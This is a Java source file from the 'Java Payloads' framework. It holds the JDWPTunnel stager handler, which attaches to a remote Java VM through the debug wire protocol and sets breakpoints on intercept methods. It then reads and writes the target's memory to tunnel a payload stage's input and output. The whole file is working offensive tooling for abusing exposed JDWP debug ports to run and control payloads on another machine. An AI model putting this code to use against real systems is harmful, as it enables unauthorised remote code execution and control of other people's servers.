/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;
import java.util.Arrays;
import java.util.List;

import javapayload.handler.stage.StageHandler;

import com.sun.jdi.ArrayReference;
import com.sun.jdi.ByteValue;
import com.sun.jdi.ClassType;
import com.sun.jdi.LocalVariable;
import com.sun.jdi.Location;
import com.sun.jdi.Method;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.event.BreakpointEvent;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventIterator;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.request.BreakpointRequest;
import com.sun.jdi.request.EventRequest;

public class JDWPTunnel extends StagerHandler implements Runnable {

	private ClassType communicationClass;
	private WrappedPipedOutputStream pipedOut;
	private PipedInputStream pipedIn;
	private PrintStream errorStream;
	
	protected void handle(StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg) throws Exception {
		this.errorStream = errorStream;
		if (extraArg == null || !(extraArg instanceof ClassType))
			throw new IllegalArgumentException("No JDWP communication class found");
		communicationClass = (ClassType) extraArg;
		VirtualMachine vm = communicationClass.virtualMachine();
		if (vm.eventRequestManager().stepRequests().size() > 0) {
			throw new RuntimeException("Some threads are currently stepping");
		}
		if (vm.eventRequestManager().breakpointRequests().size() > 0) {
			throw new RuntimeException("There are some breakpoints set");
		}
		PipedOutputStream pos = new PipedOutputStream();
		pipedOut = new WrappedPipedOutputStream(pos);
		pipedIn = new PipedInputStream();
		
		new Thread(this).start();
		stageHandler.handle(new WrappedPipedOutputStream(new PipedOutputStream(pipedIn)), new PipedInputStream(pos), parameters);
	}
	
	public void run() {
		VirtualMachine vm = communicationClass.virtualMachine();
		try {
			Location interceptIn = ((Method)communicationClass.methodsByName("interceptIn").get(0)).locationOfCodeIndex(2);
			Location interceptOut = ((Method)communicationClass.methodsByName("interceptOut").get(0)).locationOfCodeIndex(2);
			BreakpointRequest req =  vm.eventRequestManager().createBreakpointRequest(interceptIn);
			req.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
			req.setEnabled(true);
			req = vm.eventRequestManager().createBreakpointRequest(interceptOut);
			req.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
			req.setEnabled(true);
			final com.sun.jdi.event.EventQueue q = vm.eventQueue();
			boolean done = false;
			errorStream.println("== Handling I/O events...");
			while (true) {
				final EventSet es;
				if (!done) {
					es = q.remove();
				} else {
					es = q.remove(1000);
					if (es == null) {
						break;
					}
				}
				for (final EventIterator ei = es.eventIterator(); ei.hasNext();) {
					final Event e = ei.nextEvent();
					if (!done && e instanceof BreakpointEvent) {
						final BreakpointEvent be = (BreakpointEvent) e;
						final Location loc = be.location();
						final ThreadReference tr = be.thread();	
						if (loc.equals(interceptIn)) {
							LocalVariable result = (LocalVariable) loc.method().variablesByName("result").get(0);
							LocalVariable buffer = (LocalVariable) loc.method().arguments().get(0);
							ArrayReference buf = (ArrayReference) tr.frame(0).getValue(buffer);
							new InputInterceptHandler(tr, buf, result).start();
						} else if (loc.equals(interceptOut)) {
							LocalVariable result = (LocalVariable) loc.method().variablesByName("result").get(0);
							LocalVariable data = (LocalVariable) loc.method().arguments().get(0);
							ArrayReference buf = (ArrayReference) tr.frame(0).getValue(data);
							List values = buf.getValues();
							byte[] temp = new byte[buf.length()];
							for (int i = 0; i < temp.length; i++) {
								temp[i] = ((ByteValue)values.get(i)).byteValue();
							}
							pipedOut.write(temp);
							pipedOut.flush();
							if (temp.length == 0) {
								pipedOut.close();
								pipedIn.close();
								done = true;
							}
							tr.frame(0).setValue(result, vm.mirrorOf(true));
							tr.resume();
						} else {
							throw new RuntimeException("Unknown location: "+loc);
						}	
					} else {
						System.out.println("== Unknown event received: " + e.toString());
						es.resume();
					}
				}
			}
		}
		catch(Throwable t) {
			t.printStackTrace(errorStream);
		}
		vm.dispose();
	}
	
	protected boolean needHandleBeforeStart() { return false; }
	
	public class InputInterceptHandler extends Thread {
		
		private final ThreadReference thread;
		private final ArrayReference buffer;
		private final LocalVariable result;

		public InputInterceptHandler(ThreadReference thread, ArrayReference buffer, LocalVariable result) {
			this.thread = thread;
			this.buffer = buffer;
			this.result = result;
			setDaemon(true);
		}
		
		public void run() {
			try {
				byte[] temp = new byte[buffer.length()];
				int len = pipedIn.read(temp);
				if (len > 0) {
					ByteValue[] bytes = new ByteValue[len];
					for (int i = 0; i < bytes.length; i++) {
						bytes[i] = thread.virtualMachine().mirrorOf(temp[i]);
					}
					buffer.setValues(0, Arrays.asList(bytes), 0, len);
				}
				thread.frame(0).setValue(result, thread.virtualMachine().mirrorOf(len));
				thread.resume();
			} catch (Throwable t) {
				t.printStackTrace(errorStream);
			}
		}
	}
}
